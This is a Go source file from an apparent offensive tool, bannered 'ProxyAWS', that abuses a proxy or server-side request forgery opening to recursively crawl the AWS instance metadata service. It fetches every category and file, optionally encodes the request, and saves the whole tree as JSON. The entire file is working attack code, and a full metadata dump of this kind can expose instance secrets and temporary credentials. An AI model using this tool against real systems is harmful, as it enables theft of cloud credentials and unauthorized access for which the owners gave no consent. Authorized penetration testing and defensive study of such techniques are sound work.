package metadata

import (
	"encoding/json"
	"fmt"
	"strings"
)

// Local Variables

var _proxyUrl string
var _allVersions bool

var _encoder Encoder = PassthroughEncoder

// ---

// Banner for AWS Platform module

func awsBanner() {
	colorReset := "\033[0m"
	colorOrange := "\033[38;5;208m"
	fmt.Println(string(colorOrange), `
 _____                 _____ _ _ _ _____ 
|  _  |___ ___ _ _ _ _|  _  | | | |   __|
|   __|  _| . |_'_| | |     | | | |__   |
|__|  |_| |___|_,_|_  |__|__|_____|_____|
                  |___|                  
				  `, string(colorReset))

	// Print provided arguments for visibility
	fmt.Println("[#] Instance Proxy:\t" + colorOrange + _proxyUrl + colorReset)

	if _allVersions {
		fmt.Println("[#] Instance Version:\t" + colorOrange + "All" + colorReset)
	} else {
		fmt.Println("[#] Instance Version:\t" + colorOrange + "latest/" + colorReset)
	}
	fmt.Println("[#] Output Path:\t" + colorOrange + OutPath + colorReset + "\n")

}

// ---

// Function to Enumerate AWS Metadata instance

func EnumerateAWS(proxyUrl string, allVersions bool, encoder Encoder) (jsonStructure EnumeratedJSON) {
	// Set local variables for sharing among function without implicitly passing them down the line
	_proxyUrl = proxyUrl
	_allVersions = allVersions
	if encoder != nil {
		_encoder = encoder
	}

	// Print banner
	awsBanner()

	// Instantiate new AWSStructure
	awss := new(Directory)
	awss.Children = make([]interface{}, 0)

	// Specify if recursive fetch will search all version or just 'latest/'
	if allVersions {
		awss.Path = ""
		recursiveFetch(0, awss)
	} else {
		awss.Path = "latest/"
		recursiveFetch(1, awss)
	}

	fmt.Printf("\r\033[32m[+]\033[0m Enumeration Complete!\033[K\n")

	// Convert enumerated AWSStructure to JSON and return
	b, err := json.MarshalIndent(awss, "", "  ")
	if err != nil {
		panic(err)
	}
	fmt.Println("\033[32m[+]\033[0m Returning AWS Structure as JSON")
	return EnumeratedJSON(string(b))
}

// Function that recursively fetches metadata categories and appends their data to the directory structure

func recursiveFetch(depth int, parent *Directory) {
	status, items := fetchProxyData(_proxyUrl, AWS.MetadataEndpoint+parent.Path)
	// Do nothing if status is not '200 OK'
	if status == "200 OK" {
		for _, item := range items {
			// AWS doesn't have a '/' after the versions or their children (dynamic, meta-data, user-data) but we know they are directories
			// This just appends a '/' to the end of the item's path to account for this
			// When we are only enumerating the latest version we initially set depth to 1 instead of 0 to account for already being 1 layer deep
			if depth < 2 {
				item = item + "/"
			}
			var nl string
			if Verbose {
				nl = "\n"
			}
			fmt.Printf(spin() + " Enumerating: " + parent.Path + item + nl)

			// Check if item is a directory or a file
			if strings.HasSuffix(item, "/") {
				// Create new Directory object, populate values, append to pointer of parent's Children variable then pass pointer of self to children through recursiveFetch()
				// This allows us to instantly add info enumerated to our AWSStructure rather than having to wait for the return chain and the end of the line
				// Prevents wasted/lost data in event of connection being lost or an error

				// Might also be useful for multi-threading the items loop?
				self := new(Directory)
				self.Path = parent.Path + item
				self.Children = make([]interface{}, 0)
				parent.Children = append(parent.Children, self)
				recursiveFetch(depth+1, self)
			} else {
				// Create a new File object, populate values and append to pointer of parent's Children variable
				self := new(File)
				self.Path = parent.Path + item
				status, contents := fetchProxyData(_proxyUrl, AWS.MetadataEndpoint+self.Path)
				if status == "200 OK" {
					self.Value = strings.Join(contents, "\n")
				} else {
					self.Value = "404"
				}
				parent.Children = append(parent.Children, &self)
			}
		}
	}
}

// ---

// Function that calls on createURL to format the URL and fetchURL to make a GET request that it then returns

func fetchProxyData(proxy, endpoint string) (status string, body []string) {
	// Format the URL, including encoding if provided
	proxy = createURL(proxy, endpoint)
	// Fetch data and return
	status, data := fetchURL(proxy)
	return status, data
}

// ---
